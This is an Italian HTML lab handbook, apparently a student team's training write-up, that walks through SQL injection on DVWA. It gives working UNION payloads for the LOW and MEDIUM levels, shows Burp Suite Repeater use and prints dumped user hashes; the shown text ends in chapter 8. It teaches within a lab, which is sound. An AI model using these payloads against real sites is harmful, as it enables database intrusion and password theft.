@@ -1,0 +1,1090 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SQL Injection spiegata semplice — Il caso Pablo Picasso</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,600;0,9..144,800;1,9..144,400&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0d0f14;
+    --bg-alt: #141720;
+    --bg-paper: #f4efe6;
+    --ink: #111216;
+    --ink-muted: #4a4d57;
+    --accent: #00ff88;
+    --accent-dim: #00b864;
+    --danger: #ff5555;
+    --warn: #ffb84d;
+    --gold: #d4a574;
+    --purple: #c084fc;
+    --rule: #2a2e3a;
+    --rule-paper: #c9bfae;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    font-family: 'Fraunces', Georgia, serif;
+    background: var(--bg);
+    color: #e8e6df;
+    line-height: 1.7;
+    font-size: 18px;
+    overflow-x: hidden;
+  }
+  code, pre, .mono { font-family: 'JetBrains Mono', 'Courier New', monospace; }
+
+  /* COVER */
+  .cover {
+    min-height: 100vh;
+    padding: 60px 8vw;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    background:
+      radial-gradient(ellipse at top left, rgba(0, 255, 136, 0.08), transparent 60%),
+      radial-gradient(ellipse at bottom right, rgba(255, 85, 85, 0.06), transparent 60%),
+      var(--bg);
+    border-bottom: 1px solid var(--rule);
+    position: relative;
+  }
+  .cover::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+  }
+  .cover-top {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--accent);
+    z-index: 1;
+  }
+  .cover-top .tag {
+    padding: 6px 14px;
+    border: 1px solid var(--accent);
+    border-radius: 2px;
+  }
+  .cover h1 {
+    font-size: clamp(48px, 9vw, 128px);
+    line-height: 0.95;
+    font-weight: 800;
+    letter-spacing: -0.03em;
+    margin: 40px 0 20px;
+    z-index: 1;
+    position: relative;
+  }
+  .cover h1 em {
+    font-style: italic;
+    color: var(--accent);
+    font-weight: 400;
+  }
+  .cover .dek {
+    font-size: clamp(18px, 2vw, 24px);
+    color: #b8b4a8;
+    max-width: 680px;
+    font-style: italic;
+    border-left: 3px solid var(--accent);
+    padding-left: 20px;
+    z-index: 1;
+    position: relative;
+  }
+  .cover-bottom {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-end;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--ink-muted);
+    z-index: 1;
+  }
+  .cover-bottom strong { color: #e8e6df; }
+
+  /* TOC */
+  .toc {
+    padding: 80px 8vw;
+    background: var(--bg-alt);
+    border-bottom: 1px solid var(--rule);
+  }
+  .toc h2 {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 30px;
+  }
+  .toc ol { list-style: none; counter-reset: cap; }
+  .toc li {
+    counter-increment: cap;
+    padding: 18px 0;
+    border-bottom: 1px solid var(--rule);
+    display: flex;
+    align-items: baseline;
+    gap: 20px;
+    transition: color 0.2s;
+  }
+  .toc li:hover { color: var(--accent); }
+  .toc li::before {
+    content: "0" counter(cap);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 14px;
+    color: var(--ink-muted);
+    min-width: 40px;
+  }
+  .toc a {
+    color: inherit;
+    text-decoration: none;
+    font-size: 22px;
+    font-weight: 600;
+    letter-spacing: -0.01em;
+  }
+
+  /* CHAPTERS */
+  .chapter {
+    padding: 100px 8vw;
+    max-width: 1400px;
+    margin: 0 auto;
+    border-bottom: 1px solid var(--rule);
+  }
+  .chapter-num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    letter-spacing: 0.3em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 16px;
+  }
+  .chapter h2 {
+    font-size: clamp(36px, 5vw, 64px);
+    line-height: 1.05;
+    font-weight: 800;
+    letter-spacing: -0.025em;
+    margin-bottom: 40px;
+    max-width: 900px;
+  }
+  .chapter h2 em { color: var(--accent); font-style: italic; font-weight: 400; }
+  .chapter h3 {
+    font-size: 24px;
+    font-weight: 600;
+    margin: 40px 0 16px;
+    color: #fff;
+    letter-spacing: -0.01em;
+  }
+  .chapter p {
+    font-size: 19px;
+    line-height: 1.75;
+    margin-bottom: 20px;
+    max-width: 720px;
+    color: #d4d1c7;
+  }
+  .chapter p strong { color: #fff; font-weight: 600; }
+  .chapter p em { color: var(--accent); font-style: italic; }
+
+  .metaphor {
+    background: linear-gradient(135deg, rgba(212, 165, 116, 0.08), rgba(212, 165, 116, 0.02));
+    border-left: 4px solid var(--gold);
+    padding: 28px 32px;
+    margin: 32px 0;
+    border-radius: 0 4px 4px 0;
+    max-width: 760px;
+  }
+  .metaphor::before {
+    content: "🎭 Analogia";
+    display: block;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--gold);
+    margin-bottom: 12px;
+  }
+  .metaphor p { font-size: 18px; color: #e8d9c2; font-style: italic; max-width: 100%; }
+
+  .danger-box {
+    background: rgba(255, 85, 85, 0.06);
+    border: 1px solid rgba(255, 85, 85, 0.3);
+    padding: 24px 28px;
+    margin: 32px 0;
+    border-radius: 4px;
+    max-width: 760px;
+  }
+  .danger-box::before {
+    content: "⚠️ Attenzione";
+    display: block;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--danger);
+    margin-bottom: 10px;
+  }
+  .danger-box p { font-size: 16px; color: #f0d4d4; max-width: 100%; }
+
+  .tip-box {
+    background: rgba(0, 255, 136, 0.05);
+    border: 1px solid rgba(0, 255, 136, 0.25);
+    padding: 24px 28px;
+    margin: 32px 0;
+    border-radius: 4px;
+    max-width: 760px;
+  }
+  .tip-box::before {
+    content: "💡 Suggerimento";
+    display: block;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 10px;
+  }
+  .tip-box p { font-size: 16px; color: #c8e8d4; max-width: 100%; }
+
+  .bypass-box {
+    background: rgba(192, 132, 252, 0.06);
+    border: 1px solid rgba(192, 132, 252, 0.3);
+    padding: 24px 28px;
+    margin: 32px 0;
+    border-radius: 4px;
+    max-width: 760px;
+  }
+  .bypass-box::before {
+    content: "🧪 Tecnica di Bypass";
+    display: block;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--purple);
+    margin-bottom: 10px;
+  }
+  .bypass-box p { font-size: 16px; color: #e6d9f5; max-width: 100%; }
+
+  pre {
+    background: #000;
+    border: 1px solid var(--rule);
+    border-left: 3px solid var(--accent);
+    padding: 20px 24px;
+    margin: 24px 0;
+    overflow-x: auto;
+    font-size: 14px;
+    line-height: 1.6;
+    color: var(--accent);
+    border-radius: 2px;
+    max-width: 900px;
+    position: relative;
+  }
+  pre::before {
+    content: attr(data-label);
+    position: absolute;
+    top: -10px;
+    left: 16px;
+    background: var(--bg);
+    padding: 0 8px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--ink-muted);
+  }
+  pre.highlight {
+    border-left-color: var(--warn);
+    color: var(--warn);
+  }
+  code:not(pre code) {
+    background: var(--bg-alt);
+    border: 1px solid var(--rule);
+    padding: 2px 8px;
+    border-radius: 3px;
+    font-size: 0.85em;
+    color: var(--accent);
+  }
+
+  .screenshot-slot {
+    background:
+      repeating-linear-gradient(45deg, var(--bg-alt), var(--bg-alt) 10px, #1a1d27 10px, #1a1d27 20px);
+    border: 2px dashed var(--rule);
+    padding: 60px 30px;
+    text-align: center;
+    margin: 32px 0;
+    border-radius: 4px;
+    max-width: 900px;
+  }
+  .screenshot-slot .label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--ink-muted);
+    margin-bottom: 12px;
+  }
+  .screenshot-slot .title {
+    font-size: 20px;
+    font-weight: 600;
+    color: #b8b4a8;
+    margin-bottom: 8px;
+  }
+  .screenshot-slot .hint {
+    font-size: 14px;
+    color: var(--ink-muted);
+    font-style: italic;
+  }
+
+  .story-grid {
+    display: grid;
+    grid-template-columns: 80px 1fr;
+    gap: 32px;
+    margin: 40px 0;
+    max-width: 900px;
+  }
+  .story-grid .num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 48px;
+    font-weight: 700;
+    color: var(--accent);
+    line-height: 1;
+    letter-spacing: -0.05em;
+  }
+  .story-grid h4 {
+    font-size: 22px;
+    font-weight: 600;
+    margin-bottom: 12px;
+    color: #fff;
+  }
+  .story-grid p { max-width: 100%; margin-bottom: 12px; }
+
+  .table-query {
+    width: 100%;
+    max-width: 900px;
+    border-collapse: collapse;
+    margin: 24px 0;
+    background: var(--bg-alt);
+    border-radius: 4px;
+    overflow: hidden;
+  }
+  .table-query th, .table-query td {
+    padding: 14px 18px;
+    text-align: left;
+    border-bottom: 1px solid var(--rule);
+    font-size: 15px;
+  }
+  .table-query th {
+    background: #000;
+    color: var(--accent);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+  }
+  .table-query td.mono { font-family: 'JetBrains Mono', monospace; font-size: 13px; color: var(--accent); }
+
+  /* QUERY CARD */
+  .query-card {
+    background: linear-gradient(135deg, #0a0c10, #141720);
+    border: 1px solid var(--rule);
+    border-radius: 6px;
+    padding: 0;
+    margin: 32px 0;
+    max-width: 900px;
+    overflow: hidden;
+  }
+  .query-card .qc-header {
+    background: #000;
+    padding: 14px 24px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid var(--rule);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  .query-card .qc-header .level {
+    padding: 3px 10px;
+    background: var(--accent);
+    color: #000;
+    border-radius: 2px;
+    font-weight: 700;
+  }
+  .query-card .qc-header .level.medium { background: var(--warn); }
+  .query-card .qc-header .level.bonus { background: var(--purple); color: #fff; }
+  .query-card .qc-body { padding: 24px; }
+  .query-card .qc-body pre { margin: 0 0 16px 0; border-left-color: var(--accent); }
+  .query-card .qc-caption {
+    font-size: 14px;
+    color: #b8b4a8;
+    font-style: italic;
+    line-height: 1.6;
+  }
+
+  /* BURP MOCKUP */
+  .burp-mock {
+    background: #2b2b2b;
+    border: 1px solid #555;
+    border-radius: 6px;
+    margin: 32px 0;
+    max-width: 900px;
+    font-family: 'JetBrains Mono', monospace;
+    overflow: hidden;
+  }
+  .burp-mock .burp-top {
+    background: linear-gradient(to bottom, #d97706, #b45309);
+    color: #fff;
+    padding: 8px 14px;
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 0.05em;
+    display: flex;
+    justify-content: space-between;
+  }
+  .burp-mock .burp-tabs {
+    background: #1e1e1e;
+    padding: 6px 14px;
+    font-size: 11px;
+    color: #ccc;
+    border-bottom: 1px solid #444;
+  }
+  .burp-mock .burp-tabs span {
+    padding: 4px 12px;
+    display: inline-block;
+  }
+  .burp-mock .burp-tabs span.active {
+    background: #2b2b2b;
+    color: var(--accent);
+    border-radius: 3px 3px 0 0;
+  }
+  .burp-mock .burp-body {
+    padding: 18px 22px;
+    color: #ddd;
+    font-size: 13px;
+    line-height: 1.7;
+  }
+  .burp-mock .burp-body .highlight-param {
+    background: rgba(0, 255, 136, 0.15);
+    color: var(--accent);
+    padding: 1px 4px;
+    border-radius: 2px;
+  }
+
+  /* FINALE */
+  .finale {
+    padding: 120px 8vw;
+    text-align: center;
+    background:
+      radial-gradient(ellipse at center, rgba(0, 255, 136, 0.08), transparent 70%),
+      var(--bg);
+  }
+  .finale h2 {
+    font-size: clamp(48px, 8vw, 96px);
+    font-weight: 800;
+    letter-spacing: -0.03em;
+    line-height: 1;
+    margin-bottom: 30px;
+  }
+  .finale h2 em { color: var(--accent); font-style: italic; font-weight: 400; }
+  .finale p { max-width: 600px; margin: 0 auto 20px; font-size: 20px; color: #d4d1c7; }
+
+  footer {
+    padding: 40px 8vw;
+    border-top: 1px solid var(--rule);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    color: var(--ink-muted);
+    display: flex;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 20px;
+  }
+  footer .classified { color: var(--danger); }
+
+  @media (max-width: 768px) {
+    .chapter, .toc { padding: 60px 6vw; }
+    .cover { padding: 40px 6vw; }
+    .story-grid { grid-template-columns: 1fr; gap: 8px; }
+    .story-grid .num { font-size: 32px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- COPERTINA -->
+<section class="cover">
+  <div class="cover-top">
+    <span class="tag">■ Lab Handbook · v2.0</span>
+    <span>Build Week · Giorno 1 · Task 01</span>
+  </div>
+
+  <div>
+    <h1>Come si ruba<br>una password<br>con <em>una frase</em>.</h1>
+    <p class="dek">
+      Una guida illustrata per capire, passo per passo, cosa succede davvero quando un sito web non controlla bene quello che gli scrivi. Nessun prerequisito. Solo curiosità.
+    </p>
+  </div>
+
+  <div class="cover-bottom">
+    <div>
+      <strong>Il caso studio:</strong><br>
+      Pablo Picasso · DVWA · Metasploitable
+    </div>
+    <div style="text-align: right;">
+      <strong>Team - DIGITAL AVENGERS</strong><br>
+      Uso didattico · Solo lab autorizzati
+    </div>
+  </div>
+  
+   <div class="cover-bottom">
+	<div>
+		<strong>Made By:</strong><br>
+		<strong>Lorenzo Petrucci</strong> -
+		<strong>Christian Koscielniak Pinto</strong> -
+		<strong>Gabriele Chinnici</strong> -
+		<strong>Wafa Saghir</strong> -
+		<strong>Amy Antonella Acosta Hugo</strong> -
+		<strong>Domenico Mendola</strong> -
+		<strong>Corrado Vaccarecc</strong>
+	</div>
+   </div>
+</section>
+
+<!-- INDICE -->
+<nav class="toc">
+  <h2>Indice</h2>
+  <ol>
+    <li><a href="#cap1">Cos'è un database (e perché ci importa)</a></li>
+    <li><a href="#cap2">Il bibliotecario troppo gentile</a></li>
+    <li><a href="#cap3">L'apostrofo magico</a></li>
+    <li><a href="#cap4">La frase che svela tutto: UNION</a></li>
+    <li><a href="#cap5">Burp Suite: il nostro banco da lavoro</a></li>
+    <li><a href="#cap6">Il colpo al livello facile (LOW)</a></li>
+    <li><a href="#cap7">Livello medio: quando spariscono gli apici</a></li>
+    <li><a href="#cap8">Esplorare il palazzo: database, versione, tabelle</a></li>
+    <li><a href="#cap9">Il trucco esadecimale per Pablo</a></li>
+    <li><a href="#cap10">Cos'è un hash (e perché non salva nessuno)</a></li>
+    <li><a href="#cap11">La password finalmente in chiaro</a></li>
+    <li><a href="#cap12">Come difendersi davvero</a></li>
+  </ol>
+</nav>
+
+<!-- CAPITOLO 1 -->
+<article class="chapter" id="cap1">
+  <div class="chapter-num">Capitolo 01</div>
+  <h2>Cos'è un database. E perché <em>ci importa</em>.</h2>
+
+  <p>Ogni sito web che conosci — Instagram, la tua banca, il gestionale del lavoro — dietro le quinte ha un enorme <strong>archivio</strong> dove salva tutto: utenti, password, foto, messaggi, numeri di carta di credito. Questo archivio si chiama <em>database</em>.</p>
+
+  <p>Quando scrivi <strong>"mario.rossi"</strong> nella casella login e premi invio, il sito prende il tuo testo e lo usa per comporre una domanda al database. Una specie di ordine: <em>"dammi l'utente con nome mario.rossi"</em>.</p>
+
+  <div class="metaphor">
+    <p>Immagina una biblioteca enorme. Tu scrivi su un foglietto il titolo di un libro che vuoi, lo dai al bibliotecario, lui va tra gli scaffali e te lo porta. Semplice. Il database funziona uguale: tu chiedi, lui consegna.</p>
+  </div>
+
+  <p>Il linguaggio con cui il sito parla al database si chiama <strong>SQL</strong> (pronuncia: "es-qu-el" o "sequel"). È fatto di frasi tipo:</p>
+
+  <pre data-label="SQL — come il sito chiede al database">SELECT first_name, last_name FROM users WHERE user_id = '1';</pre>
+
+  <p>Tradotto: <em>"dammi nome e cognome dalla tabella utenti, dove l'id utente è 1"</em>. Il database risponde: "admin admin". Fine.</p>
+</article>
+
+<!-- CAPITOLO 2 -->
+<article class="chapter" id="cap2">
+  <div class="chapter-num">Capitolo 02</div>
+  <h2>Il bibliotecario <em>troppo gentile</em>.</h2>
+
+  <p>Il problema nasce quando il sito è pigro. Invece di controllare cosa scrivi nella casella, prende il tuo testo <strong>così com'è</strong> e lo incolla dentro la frase SQL.</p>
+
+  <div class="metaphor">
+    <p>È come un bibliotecario che, al posto di leggere il tuo foglietto e trascriverlo con cura, ti permette di scrivere direttamente sul registro degli ordini. Se tu scrivi "Il Piccolo Principe", lui ti porta quello. Ma se scrivi "Il Piccolo Principe e poi anche tutti i libri segreti del piano di sotto"... lui obbedisce.</p>
+  </div>
+
+  <p>Questo trucco si chiama <strong>SQL Injection</strong> — letteralmente, "iniettare SQL". L'idea è semplice: sfruttiamo il fatto che il sito non controlla il nostro input per <em>aggiungere pezzi di frase</em> che il sito non avrebbe mai voluto eseguire.</p>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/Screenshot_01.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Fig. 1 — Interfaccia iniziale della vulnerabilità su DVWA.
+  </p>
+</div>
+</article>
+
+<!-- CAPITOLO 3 -->
+<article class="chapter" id="cap3">
+  <div class="chapter-num">Capitolo 03</div>
+  <h2>L'apostrofo <em>magico</em>.</h2>
+
+  <p>Come facciamo a capire se un sito è "pigro"? Proviamo a scrivergli qualcosa di inaspettato. Nel nostro laboratorio scriviamo un <strong>singolo apostrofo</strong> — <code>'</code> — nella casella e premiamo Submit.</p>
+
+  <p>Se il sito è costruito bene, non succede niente: al massimo dice "utente non trovato". Ma se è pigro, risponde con un messaggio di errore incomprensibile, pieno di termini tecnici. Questo errore è per noi una <strong>confessione</strong>: significa che il nostro apostrofo è arrivato fino al database e lo ha confuso.</p>
+
+  <pre data-label="Errore rivelatore (buona notizia per l'attaccante)">You have an error in your SQL syntax; check the manual
+that corresponds to your MySQL server version...</pre>
+
+  <div class="tip-box">
+    <p>L'apostrofo è il nostro primo "colpetto alla porta". Se la porta traballa, sappiamo che non è blindata.</p>
+  </div>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/Screenshot_02.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Fig. 2 — Visualizzare il messaggio d'errore completo su sfondo DVWA
+  </p>
+</div>
+</article>
+
+<!-- CAPITOLO 4 -->
+<article class="chapter" id="cap4">
+  <div class="chapter-num">Capitolo 04</div>
+  <h2>La frase che svela tutto: <em>UNION</em>.</h2>
+
+  <p>In SQL esiste una parola magica: <code>UNION</code>. Serve a <strong>incollare</strong> i risultati di due domande diverse in un'unica risposta.</p>
+
+  <p>L'idea è geniale: noi non vogliamo davvero l'utente numero 1. Vogliamo fare una <em>seconda</em> domanda — quella vera, quella che ci interessa — e attaccarla al risultato della prima.</p>
+
+  <div class="metaphor">
+    <p>È come consegnare al bibliotecario due foglietti spillati insieme. Il primo è una richiesta banale (o addirittura impossibile). Il secondo è la nostra domanda vera: "dammi la lista di tutti i nomi e le password". Il bibliotecario, obbediente, ci risponde con entrambi.</p>
+  </div>
+
+  <p>C'è una regola importante: le due domande devono restituire lo <strong>stesso numero di colonne</strong>. Se la prima domanda ha 2 colonne (nome e cognome), anche la seconda deve averne 2. Fortunatamente, nel nostro caso la pagina DVWA mostra esattamente due campi (<em>First name</em> e <em>Surname</em>), quindi sappiamo già dove finiranno i dati rubati.</p>
+
+  <pre data-label="Struttura generica di un attacco UNION">[ input normale ] UNION SELECT colonna1, colonna2 FROM tabella_bersaglio</pre>
+</article>
+
+<!-- CAPITOLO 5 -->
+<article class="chapter" id="cap5">
+  <div class="chapter-num">Capitolo 05</div>
+  <h2>Burp Suite: il nostro <em>banco da lavoro</em>.</h2>
+
+  <p>Per fare tutto questo potremmo scrivere i nostri payload direttamente nella casella del sito, ma è scomodo: la casella a volte limita i caratteri, il browser codifica male, e ogni modifica richiede un nuovo invio manuale.</p>
+
+  <p>La soluzione professionale è <strong>Burp Suite</strong>. È un <em>proxy</em> che si mette tra il nostro browser e il sito: intercetta ogni richiesta, ce la mostra per intero, e ci permette di modificarla pezzo per pezzo prima di inoltrarla.</p>
+
+  <div class="metaphor">
+    <p>Pensa a Burp come a una tavola da chirurgo. Sopra c'è la richiesta HTTP "aperta": puoi vedere ogni organo (URL, parametri, cookie, header) e modificarlo con precisione chirurgica, poi rilanciarla col pulsante Send. Se il risultato non ti convince, modifichi ancora e rilanci. Si chiama <strong>Repeater</strong> proprio per questo: ripeti, ripeti, ripeti.</p>
+  </div>
+
+  <h3>Dove modificare il payload in Burp</h3>
+  <p>La nostra richiesta a DVWA è di tipo <strong>GET</strong>: significa che i parametri viaggiano <em>nell'URL stesso</em>, dopo il punto interrogativo. Burp Suite ce li mostra in una sezione apposita — <strong>"Request query parameters"</strong> — dove possiamo editare il valore del campo <code>id</code> senza toccare il resto.</p>
+
+  <div class="burp-mock">
+    <div class="burp-top">
+      <span>Burp Suite Community · Repeater</span>
+      <span>⟳ Send</span>
+    </div>
+    <div class="burp-tabs">
+      <span>Request</span>
+      <span class="active">Params</span>
+      <span>Headers</span>
+      <span>Response</span>
+    </div>
+    <div class="burp-body">
+      <div style="color: #999; margin-bottom: 10px;">▸ Request query parameters</div>
+      <div style="padding-left: 20px;">
+        Name: <span style="color: #ffb84d;">id</span><br>
+        Value: <span class="highlight-param">' UNION SELECT user, password FROM users #</span><br><br>
+        Name: <span style="color: #ffb84d;">Submit</span><br>
+        Value: Submit
+      </div>
+    </div>
+  </div>
+
+  <div class="tip-box">
+    <p>Ogni payload che vedrai nei prossimi capitoli va incollato <em>nel valore del parametro <code>id</code></em>. Il resto della richiesta non si tocca.</p>
+  </div>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/Screenshot_03.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Burp Suite — Request inviata al Repeater
+	Fig. 3 — Schermata Repeater con parametro id evidenziato, pronto per modifica
+  </p>
+</div>
+</article>
+
+<!-- CAPITOLO 6 -->
+<article class="chapter" id="cap6">
+  <div class="chapter-num">Capitolo 06</div>
+  <h2>Il colpo al livello <em>facile (LOW)</em>.</h2>
+
+  <p>Al livello di sicurezza più basso, il codice di DVWA prende il nostro input e lo incolla <strong>tra due apici</strong> nella query:</p>
+
+  <pre data-label="Query originale generata dal sito">SELECT first_name, last_name FROM users WHERE user_id = '$id';</pre>
+
+  <p>Dove <code>$id</code> è esattamente quello che noi scriviamo. La nostra strategia in tre mosse:</p>
+
+  <div class="story-grid">
+    <div class="num">1</div>
+    <div>
+      <h4>Chiudere l'apice aperto dal sito</h4>
+      <p>Iniziamo il nostro payload con un apostrofo <code>'</code>, così chiudiamo il literal string e il motore SQL torna in modalità "comando".</p>
+    </div>
+  </div>
+
+  <div class="story-grid">
+    <div class="num">2</div>
+    <div>
+      <h4>Aggiungere la nostra query</h4>
+      <p>Scriviamo la nostra UNION per chiedere utenti e password.</p>
+    </div>
+  </div>
+
+  <div class="story-grid">
+    <div class="num">3</div>
+    <div>
+      <h4>Commentare il resto</h4>
+      <p>Alla fine mettiamo un <code>#</code>. In MySQL questo è il carattere di commento: tutto ciò che viene dopo viene ignorato. Serve per neutralizzare l'apice di chiusura che il sito mette automaticamente dopo il nostro input.</p>
+    </div>
+  </div>
+
+  <div class="query-card">
+    <div class="qc-header">
+      <span>Payload Main Task — DVWA Security</span>
+      <span class="level">LOW</span>
+    </div>
+    <div class="qc-body">
+      <pre data-label="Da incollare in Burp · parametro id">' UNION SELECT user, password FROM users #</pre>
+      <p class="qc-caption">Apice di chiusura + UNION per estrarre username e hash password da tutta la tabella <code>users</code>. Il <code>#</code> finale commenta ciò che resta della query originale.</p>
+    </div>
+  </div>
+
+  <p>Premiamo Send in Burp. La risposta contiene <strong>tutti e cinque</strong> gli utenti di DVWA con i loro hash:</p>
+
+  <pre data-label="Response — dump completo">First name: admin       Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+First name: gordonb     Surname: e99a18c428cb38d5f260853678922e03
+First name: 1337        Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+First name: pablo       Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+First name: smithy      Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
+
+  <p>🎯 <strong>L'hash di Pablo Picasso è nelle nostre mani:</strong> <code>0d107d09f5bbe40cade3de5c71e9e9b7</code>. Manca solo trasformarlo in password leggibile. Ma prima, alziamo l'asticella.</p>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/Screenshot_04.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Response DVWA — tutti gli utenti + hash
+	Fig. 4 - Tabella con 5 righe, hash di Pablo evidenziato in rosso
+  </p>
+</div>
+</article>
+
+<!-- CAPITOLO 7 -->
+<article class="chapter" id="cap7">
+  <div class="chapter-num">Capitolo 07</div>
+  <h2>Livello medio: <em>quando spariscono gli apici</em>.</h2>
+
+  <p>Al livello <strong>Medium</strong>, i programmatori di DVWA hanno provato a difendersi. Hanno aggiunto una funzione che si chiama <code>mysqli_real_escape_string</code>. Sembra seria, e in parte lo è: prende il nostro input e mette una barra prima di ogni apostrofo, in modo che venga letto come carattere innocuo invece che come "chiusura di literal".</p>
+
+  <p>Ma c'è un errore di progettazione gigante. La nuova query non mette più gli apici intorno all'id:</p>
+
+  <pre data-label="Query al livello Medium" class="highlight">SELECT first_name, last_name FROM users WHERE user_id = $id;</pre>
+
+  <p>Senza apici, la funzione di escape <em>non ha nulla da escapare</em>. Il parametro <code>$id</code> è trattato come un <strong>numero</strong>, non come stringa. E i numeri in SQL non hanno bisogno di apici: si scrivono liberi.</p>
+
+  <div class="metaphor">
+    <p>È come mettere un buttafuori all'ingresso di un locale, ma fargli controllare solo i cappelli. Chi entra senza cappello passa, anche se ha un'ascia in mano.</p>
+  </div>
+
+  <div class="query-card">
+    <div class="qc-header">
+      <span>Payload Bonus B1 — DVWA Security</span>
+      <span class="level medium">MEDIUM</span>
+    </div>
+    <div class="qc-body">
+      <pre data-label="Da incollare in Burp · parametro id">1 UNION SELECT user, password FROM users</pre>
+      <p class="qc-caption">Nessun apice (non serve chiudere nulla), nessun commento finale (la query non ha coda da neutralizzare). Il <code>1</code> iniziale soddisfa la parte <code>WHERE user_id =</code>, poi <code>UNION</code> aggiunge la nostra selezione.</p>
+    </div>
+  </div>
+
+  <p>Al Medium la richiesta è <strong>POST</strong> anziché GET, ma Burp Suite gestisce tutto nel pannello <em>Params</em> allo stesso modo: troviamo il parametro <code>id</code> nel corpo della richiesta e sostituiamo il valore.</p>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/Screenshot_05.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Burp Suite su request Medium
+	Fig. 5 - Payload UNION nel body della richiesta, risposta con tutti gli utenti
+  </p>
+</div>
+</article>
+
+  <p>Risultato: <strong>identico al LOW</strong>. Stesso dump, stessi hash, stessa vittoria. La "difesa" del Medium era solo una patina di vernice.</p>
+</article>
+
+<!-- CAPITOLO 8 -->
+<article class="chapter" id="cap8">
+  <div class="chapter-num">Capitolo 08</div>
+  <h2>Esplorare il palazzo: <em>database, versione, tabelle</em>.</h2>
+
+  <p>Fin qui siamo andati dritti al bersaglio (gli utenti). Ma un attaccante professionista prima <em>esplora</em>. Vuole sapere: dove sono? quanto è grande questo palazzo? che porte ci sono? Da ora in poi useremo un pattern elegantissimo: invece di scrivere <code>1, 2</code> come placeholder nella prima colonna, usiamo <strong><code>null</code></strong>. È il modo ufficiale di dire "questa colonna non mi serve".</p>
+
+  <div class="tip-box">
+    <p>Il <code>null</code> è come una casella vuota nel modulo: il sistema la accetta senza lamentarsi e noi concentriamo l'attenzione solo sulla colonna che ci interessa davvero (la seconda, dove finisce l'informazione rubata).</p>
